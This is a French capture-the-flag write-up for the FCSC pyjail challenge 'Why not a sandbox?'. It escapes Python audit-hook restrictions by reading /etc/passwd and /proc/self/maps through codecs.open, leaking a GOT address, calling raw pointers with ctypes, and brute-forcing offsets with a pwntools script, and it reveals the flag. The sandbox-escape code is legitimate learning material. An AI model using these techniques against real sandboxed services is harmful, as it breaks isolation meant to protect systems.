# Why not a sandbox ? - PWN - 500

> Votre but est d'appeler la fonction print_flag pour afficher le flag.

Nous continuons sur la lancée des challenges pwn avec un challenge qui semble être une pyjail.
Comme dit dans l'énoncé, nous devons appeler la fonction print_flag pour afficher le flag.

Soit, commençons.

## Énumération de l'environnement

On essaie dans un premier temps d'appeler la fonction "print_flag" (même si ça serait trop facile)

```
>>> print_flag
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'print_flag' is not defined
```

Ok, bon ça commence bien. La fonction n'est même pas définie, on va devoir aller chercher un peu plus loin.
En jouant un peu avec l'environnement, on se rend compte de plusieurs choses:

* Certains événements semblent être filtrés, et notifiés par le message **Exception: Action interdite**
* Certains modules semblent être interdits, comme nous le dit le message **Exception: Module non autorisé**

Le message **Exception ignored in audit hook** est également spécifié en plus des deux précédents.

Cela semble être réalisé via les "[Python Runtime Audit Hooks](https://www.python.org/dev/peps/pep-0578/)", disponibles depuis la version 3.8 de Python.
Cette fonctionnalité permet entre autres d'ajouter des hooks qui vont permettre d'intercepter un événement.

On remarque que 2 modules peuvent être importés:

* sys
* ctypes

En énumérant le module sys, nous remarquons que le module **codecs** est présent, et contient la fonction **open**.
Essayons de lire un fichier avec:

```
>>> import sys
>>> codecs = sys.modules['codecs']
>>> codecs.open('/etc/passwd').read()
'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nctf-init:x:1000:1000::/home/ctf-init:\nctf:x:1001:1001::/home/ctf:\n'
```
Super, on peut lire (et écrire) des fichiers sur le système ! 

Selon la documentation,
> ctypes is a foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python.

Nous pouvons donc grâce à ctypes intéragir avec des librairies externes, et utiliser des types compatibles avec le C tels que des pointeurs, des entiers etc ...

Nous avons également le module os disponible dans ctypes:
```
>>> import ctypes
>>> os = ctypes._os
>>> os
<module 'os' from '/usr/lib/python3.8/os.py'>
```

Bien que beaucoup de fonctions soient filtrées, nous pouvons tout de même exécuter des commandes avec popen.


## Récupération d'informations sur le processus

Nous allons essayer d'en savoir un peu plus sur le processus de l'interpréteur grâce aux "fichiers" disponibles dans /proc/self.

En affichant le mappage mémoire du processus (/proc/self/maps) on remarque qu'une librairie suspecte est chargée:

```
7f9888ac3000-7f9888ac4000 r--p 00000000 09:03 14419477                   /app/lib_flag.so
7f9888ac4000-7f9888ac5000 r-xp 00001000 09:03 14419477                   /app/lib_flag.so
7f9888ac5000-7f9888ac6000 r--p 00002000 09:03 14419477                   /app/lib_flag.so
7f9888ac6000-7f9888ac7000 r--p 00002000 09:03 14419477                   /app/lib_flag.so
7f9888ac7000-7f9888ac8000 rw-p 00003000 09:03 14419477                   /app/lib_flag.so
``` 

On essaie de ce pas de charger cette librairie avec ctypes !

```
>>> ctypes.cdll.LoadLibrary('/app/lib_flag.so')
Exception: Nom de fichier interdit
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/ctypes/__init__.py", line 451, in LoadLibrary
    return self._dlltype(name)
  File "/usr/lib/python3.8/ctypes/__init__.py", line 373, in __init__
    self._handle = _dlopen(self._name, mode)
Exception: Action interdite
```

Ah bah non du coup ...

On essaie quand même de la lire:

```
>>> o('/app/lib_flag.so')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/codecs.py", line 905, in open
    file = builtins.open(filename, mode, buffering)
PermissionError: [Errno 13] Permission denied: '/app/lib_flag.so'
```

Mais nous n'avons pas le droit de lecture dessus ... 

En continuant de lire des fichiers qui peuvent nous être utiles, nous remarquons ceci:

```
>>> o('/proc/self/cmdline').read()
'./spython\x00-S\x00-B\x00-I\x00'
```

L'interpreteur python semble être wrappé par un autre programme qui doit auditer les événements.
Analysons-le en local:
```
o('./spython', 'rb').read()
```

## Analyse statique du superviseur

```
$ ldd spython
	linux-vdso.so.1 (0x00007ffede3e8000)
	libpython3.8.so.1.0 => not found
	lib_flag.so => not found
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fabcf1d1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fabcf5c2000)
```

Comme constaté avant, nous voyons cette librairie lib_flag.so qui est chargée à l'exécution du programme.
Donc son code, qui contient aussi la fonction "print_flag" est présent aussi en mémoire !

J'ai essayé de leak l'espace mappé pour reconstituer l'ELF de la librairie, mais l'agencement en mémoire étant différent de l'agencement statique d'un ELF je n'ai pas réussi ...

J'ai quand même pu leak le segment .text de la librarie avec ctypes:

```
>>> base_text = 0x7f9888ac4000
>>> ptr = c.POINTER(c.c_char)

for i in range(0x1000):
... 	mem += chr(ord(c.cast(base_text+i,ptr).contents.value))
mem
```

En analysant de plus près spython, nous remarquons que la fonction "welcome" est appelée au début du programme, elle est présente dans la librairie lib_flag et est donc présente dans la GOT de spython.

Nous retrouvons également dans spython l'appel à **PySys_AddAuditHook** qui va permettre le filtrage des événements.

## Leak de l'adresse de la fonction welcome

Le binaire spython est mappé à ces adresses en mémoire:

```
561e4a711000-561e4a712000 r--p 00000000 09:03 14419495                   /app/spython
561e4a712000-561e4a713000 r-xp 00001000 09:03 14419495                   /app/spython
561e4a713000-561e4a714000 r--p 00002000 09:03 14419495                   /app/spython
561e4a714000-561e4a715000 r--p 00002000 09:03 14419495                   /app/spython
561e4a715000-561e4a716000 rw-p 00003000 09:03 14419495                   /app/spython
```

L'offset de l'entrée de la fonction welcome dans la GOT est à 0x40a8

On peut lire ce qui se situe à cette adresse en partant de la base du programme en mémoire:

```
>>> import ctypes as c
>>> base = 0x561e4a711000
>>> ptr = c.POINTER(c.c_long)
>>> v = c.cast(base+0x40a8,ptr).contents.value
>>> hex(v)
'0x7f9888ac4115'
```

On peut vérifier que ce soit bien la fonction welcome en l'appelant directement:

```
>>> fptr = c.CFUNCTYPE(c.c_void_p)
>>> f = fptr(0x7f9888ac4115)
>>> f()
Arriverez-vous à appeler la fonction print_flag ?
51
```

Bingo! La fonction print_flag ne doit pas être située bien loin ...

## Appel de la fonction print_flag

N'ayant pas réussi à reconstituer l'ELF de la librairie, je ne sais pas où est située exactement print_flag dans le binaire ...

J'ai également essayé de désassembler la section text pour trouver un pattern reconnaissable de début de fonction (push rbp  / sub rsp ...), mais le code était assez étrange et contenait pas mal d'opcode "ret" (0xc3).

N'ayant pas eu la foi de tout analyser, j'ai donc fait un script qui allait scruter chaque adresse du segment text de la librairie après welcome, et essaie de jump à cette adresse en espérant tomber sur la fonction print_flag !

Remarque: À cause de l'ASLR, on doit récupérer à chaque fois l'adresse de base de la librarie lib_flag.

Ni une ni deux, on code un petit script hyper propre (non):

```py
#!/usr/bin/python

from pwn import *

commands = """c = __import__('ctypes')
o = __import__('sys').modules['codecs'].open
ptr = c.CFUNCTYPE(c.c_void_p)
res = o('/proc/self/maps').read()
base = int(res[6417:6417+12],16)""".splitlines()

context.log_level = 'error'

while True:
	for i in range(0x115, 0x400):
		r = remote('challenges1.france-cybersecurity-challenge.fr', 4005)

		r.recv()

		for c in commands:
			r.sendline(c)
			r.recv()

		r.sendline("f = ptr(base+"+hex(i)+")")
		r.recv()
		r.sendline("f()")
		try:
			res = r.recv()
			print(hex(i), res)
		except:
			pass
		r.close()
```
On remarque quelque chose vers l'offset 0x12f !
```
('0x12f', 'super flag: FCSC{55660e5c9e048d988917e2922eb \xb2e\xc9\xfe\x7f\r\n')
```

On essaie de boucler dans cette zone d'adresse:

```py
#!/usr/bin/python

from pwn import *

commands = """c = __import__('ctypes')
o = __import__('sys').modules['codecs'].open
ptr = c.CFUNCTYPE(c.c_void_p)
res = o('/proc/self/maps').read()
base = int(res[6417:6417+12],16)""".splitlines()

context.log_level = 'error'

while True:
	for i in range(0x120, 0x130):
		r = remote('challenges1.france-cybersecurity-challenge.fr', 4005)

		r.recv()

		for c in commands:
			r.sendline(c)
			r.recv()

		r.sendline("f = ptr(base+"+hex(i)+")")
		r.recv()
		r.sendline("f()")
		try:
			res = r.recv()
			if "super flag" in res: 
				print(hex(i), res)
		except:
			pass
		r.close()
```
```
('0x129', 'super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}\r\n')
```

Hop là on a enfin réussi à appeler cette fameuse fonction **print_flag** !

FLAG: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}